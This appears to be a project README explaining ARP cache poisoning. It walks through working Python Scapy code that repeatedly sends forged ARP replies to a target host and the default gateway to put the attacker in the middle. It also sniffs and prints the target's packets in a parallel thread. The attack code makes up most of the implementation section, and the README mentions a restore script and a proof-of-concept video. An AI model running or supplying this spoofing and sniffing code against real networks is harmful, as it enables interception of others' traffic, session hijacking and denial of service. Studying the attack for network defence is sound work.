# ARP Poisoning

ARP spoofing, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker's MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.

ARP spoofing may allow an attacker to intercept data frames on a network, modify the traffic, or stop all traffic. Often the attack is used as an opening for other attacks, such as denial of service, man in the middle, or session hijacking attacks.

# Implementation
1. **Import Statements and Configuration**:
    - `from scapy.all import *`: Imports all functions and classes from the Scapy library, which is a powerful packet manipulation library.
    - `import threading`: Imports the threading module, which allows for the creation of threads.
    - `import time`: Imports the time module for time-related functions.
    - `conf.checkIPaddr = False`: Disables Scapy's IP address checking, allowing ARP packets to be sent without matching the sender's IP address.


2. **Variables**:  
    - `interval`: Time interval (10 seconds) between sending ARP packets.
    - `DEFAULT_GATEWAY`: IP address of the network's default gateway (e.g., a router).
    - `TARGET_IP`: IP address of the target machine within the network.


3. **Packet Sniffing Function (`sniff_packets`)**:  
    - `process_packet`: A function that processes each sniffed packet. It checks if the packet's source MAC address matches that of the target IP. If it does, the packet summary is printed.
    - `sniff`: Sniffs the network packets on the "Ethernet" interface and applies the `process_packet` function to each packet.
```python
def process_packet(packet):
    if packet.fields["src"] == getmacbyip(TARGET_IP):
        print(packet.summary())

def sniff_packets():
    sniff(iface = "Ethernet", prn = process_packet)
```


4. **ARP Spoofing Function (`send_packets`)**:
    - `spoof`: Creates an ARP reply packet that falsely tells the target machine that the attacker's machine has the IP of the default gateway, and vice versa. This way, the attacker's machine becomes the man-in-the-middle.
    - The `spoof` function is called repeatedly in a loop for both the target and the default gateway, causing both to associate the attacker's MAC address with the other's IP address.
```python
def spoof(target_ip, spoof_ip):
    arp_reply = ARP(op = 2, pdst = target_ip, hwdst = getmacbyip(target_ip), psrc = spoof_ip)
    send(arp_reply, verbose = False)

def send_packets():
    while True:
        spoof(TARGET_IP, DEFAULT_GATEWAY)
        spoof(DEFAULT_GATEWAY, TARGET_IP)
        time.sleep(interval)
```


5. **Threads Creation and Execution**:
    - `thread1` and `thread2` are created to run `sniff_packets` and `send_packets` functions, respectively.
    - The threads are started, allowing simultaneous execution of packet sniffing and ARP spoofing.
```python
thread1 = threading.Thread(target=sniff_packets)
thread1.start()

thread2 = threading.Thread(target=send_packets)
thread2.start()
```


# Restore
The `restore.py` script restores the initial state of the ARP table of the target and the default gateway.


# PoC
![YouTube](./PoC.mp4)
